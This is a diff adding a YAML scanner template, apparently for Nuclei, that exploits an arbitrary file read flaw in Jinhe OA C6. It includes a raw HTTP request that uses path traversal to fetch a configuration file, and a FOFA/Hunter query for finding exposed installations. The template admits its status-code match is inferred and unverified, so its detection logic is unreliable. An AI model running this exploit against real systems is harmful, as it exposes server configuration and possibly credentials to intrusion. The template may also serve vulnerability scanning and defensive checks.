@@ -1,0 +1,35 @@
+id: poc-6f52ef107a748a8bfa32
+info:
+  name: 金和OAC6UploadImageDownLoadIn存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6f52ef107a748a8bfa3268c63b3d569f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6f52ef107a748a8bfa3268c63b3d569f
+    fofa: + hunter`app.name="金和 OA"`
+http:
+- raw:
+  - 'GET /c6/JHSoft.Web.CustomQuery/UploadImageDownLoadIn.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+
+    Accept: image/avif,image/webp,*/*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Length: 4'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
